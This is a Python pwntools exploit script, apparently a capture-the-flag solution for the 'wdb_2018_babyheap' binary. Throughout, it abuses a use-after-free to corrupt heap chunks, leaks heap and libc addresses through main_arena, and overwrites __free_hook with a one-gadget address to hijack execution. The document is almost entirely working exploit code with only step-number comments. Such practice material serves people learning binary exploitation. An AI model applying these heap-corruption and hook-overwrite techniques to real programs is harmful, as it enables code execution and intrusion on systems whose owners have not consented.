from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/bin/heap23_02_wdb_2018_babyheap')
p = process('./data/bin/heap23_02_wdb_2018_babyheap')
libc = elf.libc
sl = lambda s : p.sendline(s.encode() if isinstance(s, str) else s)
sd = lambda s : p.send(s.encode() if isinstance(s, str) else s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s.encode() if isinstance(s, str) else s)
ti = lambda : p.interactive()

def malloc(index,Content):
    ru("Choice:")
    sl('1')
    ru("Index:")
    sl(str(index))
    ru("Content:")
    sd(Content)

def free(Index):
    ru("Choice:")
    sl('4')
    ru("Index:")
    sl(str(Index))

def puts(Index):
    ru("Choice:")
    sl('3')
    ru("Index:")
    sl(str(Index))

def exit():
    ru("Choice:")
    sl('5')

def edit(index,Content):
    ru("Choice:")
    sl('2')
    ru("Index:")
    sl(str(index))
    ru("Content:")
    sd(Content)

malloc(0,b'aaaaaaaa\n');malloc(1,b'bbbbbbbb\n');free(1);free(0)#step.1
puts(0)#step.2
heap_addr = u64(rc(4).ljust(8,b'\x00')) - 0x30;py1 = p64(heap_addr+0x20) + p64(0) + p64(0) + p64(0x31);edit(0,py1)#step.3
malloc(6,b'aaa\n');malloc(7,p64(0) + p64(0xa1) + b'\n');malloc(2,b'cccccccc\n');malloc(3,b'dddddddd\n')#step.4
py2 = p64(0x90)+p64(0x21)+b'\n'
malloc(4,py2)#step.5

free(1)#step.7
puts(1)#step.8
main_arena = u64(rc(6).ljust(8,b'\x00')) - 88
libc_base = (main_arena&0xfffffffff000) - 0x3c4000
log.success("libc_base: " + hex(libc_base))
onegadget = libc_base + 0x4527a
free_hook = libc_base + libc.symbols["__free_hook"]
edit(4,p64(free_hook) + b'\n')#step.9
edit(1,p64(onegadget) + b'\n')#step.10